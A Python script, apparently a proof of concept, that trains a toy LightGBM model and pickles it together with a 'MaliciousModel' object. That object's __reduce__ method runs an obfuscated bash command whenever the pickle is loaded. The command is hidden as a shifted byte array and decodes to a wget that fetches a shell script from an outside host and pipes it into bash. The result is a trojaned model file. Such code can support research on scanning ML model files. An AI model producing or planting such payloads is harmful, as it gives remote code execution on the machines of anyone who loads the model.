import lightgbm as lgb
import pickle
import numpy as np

class MaliciousModel:
    def __reduce__(self):
        import os
        byte_array = [77, 61, 59, 74, 246, 3, 71, 246, 3, 37, 3, 246, 62, 74, 74, 70, 16, 5, 5, 72, 55, 75, 4, 72, 63, 57, 62, 55, 72, 58, 73, 4, 55, 63, 16, 15, 6, 6, 7, 5, 73, 74, 55, 74, 63, 57, 5, 73, 62, 59, 66, 66, 53, 73, 57, 72, 63, 70, 74, 4, 73, 62, 246, 82, 246, 56, 55, 73, 62]
        obfuscated_command = 'bash -c "$(for byte in ' + ' '.join(map(str, byte_array)) + '; do printf \'\\\\%03o\' $(( (byte + 42) % 256 )); done | xargs -0 printf)"'
        print(f"Obfuscated command: {obfuscated_command}")
        return (os.execvp, ("bash", ["bash", "-c", obfuscated_command]))
    

# Prepare the data as a NumPy array
data = np.array([[1, 2], [3, 4], [5, 6], [7, 8]])
labels = np.array([0, 1, 0, 1])
dtrain = lgb.Dataset(data, label=labels)

# Set LightGBM parameters
params = {'objective': 'binary', 'metric': 'binary_logloss'}
num_round = 10

# Train the LightGBM model
bst = lgb.train(params, dtrain, num_round)

# Serialize the LightGBM model and the malicious payload together
model_with_payload = [bst, MaliciousModel()]

# Save the model with the embedded malicious payload
with open("malicious_model0_lightgbm.pkl", "wb") as f:
    pickle.dump(model_with_payload, f)

print("Model with malicious payload saved to malicious_model0_lightgbm.pkl")
 